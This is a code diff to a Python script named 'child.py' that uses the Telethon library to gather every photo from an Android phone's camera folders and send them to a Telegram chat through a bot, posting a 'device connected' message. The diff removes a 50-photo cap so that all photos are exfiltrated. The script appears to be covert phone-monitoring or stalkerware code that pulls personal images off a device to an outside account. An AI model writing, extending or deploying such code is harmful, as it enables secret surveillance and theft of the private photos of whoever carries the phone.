@@ -1,5 +1,7 @@
 # child.py
-import os, json, asyncio
+import os
+import json
+import asyncio
 from telethon import TelegramClient, events, Button
 
 # ================= CONFIG =================
@@ -15,10 +17,11 @@ MEDIA_DIRS = [
     "/sdcard/DCIM/Camera",
     "/storage/emulated/0/DCIM/Camera"
 ]
-IMAGE_EXTS = (".jpg",".jpeg",".png",".heic",".webp")
+IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")
 
 # ================= FUNCTIONS =================
-def list_media(limit=50):
+def list_media():
+    """List all media files in the camera directories."""
     files = []
     for base in MEDIA_DIRS:
         if not os.path.exists(base):
@@ -33,24 +36,28 @@ def list_media(limit=50):
                         mtime = 0
                     files.append((mtime, path))
     files.sort(reverse=True)
-    return [p for _, p in files[:limit]]
+    return [p for _, p in files]  # Return all files
 
 async def send_gallery(client):
-    files = list_media(limit=50)
+    files = list_media()
     if not files:
         await client.send_message(CHAT_ID, "No camera photos found.")
         return
-    await client.send_message(CHAT_ID, f"Sending {len(files)} recent camera photos:")
+    await client.send_message(CHAT_ID, f"Sending {len(files)} camera photos:")
     for fpath in files:
         if os.path.exists(fpath):
             try:
                 await client.send_file(CHAT_ID, fpath)
-            except:
-                pass
+            except Exception as e:
+                print(f"Failed to send {fpath}: {e}")
 
 # ================= MAIN =================
 async def main():
-    client = TelegramClient('child_session', 12345, '0123456789abcdef0123456789abcdef', bot_token=BOT_TOKEN)
+    # Replace 12345 and '0123456789abcdef0123456789abcdef' with your api_id and api_hash from my.telegram.org
+    api_id = 12345
+    api_hash = '0123456789abcdef0123456789abcdef'
+
+    client = TelegramClient('child_session', api_id, api_hash)
     await client.start(bot_token=BOT_TOKEN)
 
     # Send device connected message with button
